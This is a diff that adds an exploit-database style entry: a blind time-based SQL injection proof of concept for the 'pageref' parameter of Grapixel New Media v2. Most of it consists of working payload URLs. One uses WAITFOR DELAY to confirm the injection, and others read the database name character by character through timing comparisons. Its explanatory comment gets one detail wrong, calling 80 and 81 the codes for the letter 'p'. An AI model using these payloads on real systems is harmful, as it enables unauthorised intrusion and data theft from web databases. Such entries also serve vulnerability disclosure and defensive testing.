@@ -1,0 +1,24 @@
+# Exploit Title: Grapixel New Media 2 - 'pageref' SQL Injection
+# Exploit Author: Berk Dusunur
+# Google Dork: N/A
+# Type: Web App
+# Date: 2018-10-26
+# Vendor Homepage: http://www.grapixel.com
+# Software Link: http://www.grapixel.com
+# Affected Version: v2
+# Tested on: MacosX
+# CVE : N/A
+
+#Proof Of Concept
+# Time-Based sql injection is called a data extraction event with request response times 
+# with the server when there is no other way for it to extract aggressive data. It should 
+# be determined by sql injection type. I discovered blind time-based sql injection. 
+# Because single quotes didn't break the page structure, so I tried to get results 
+# using waitfor delay instead.
+
+http://target/pages.aspx?pageref=[SQL]
+http://target/pages.aspx?pageref=' waitfor delay '00:00:05'--;
+http://target/pages.aspx?pageref=';IF(UNICODE(SUBSTRING((SELECT DB_NAME(12)),1,1))>80) WAITFOR DELAY '0:0:5'--
+http://target/pages.aspx?pageref=';IF(UNICODE(SUBSTRING((SELECT DB_NAME(12)),1,1))>81) WAITFOR DELAY '0:0:5'--
+
+Ascii equivalent of 80,81 figures The first database, wait 5 seconds if the first letter is "p"
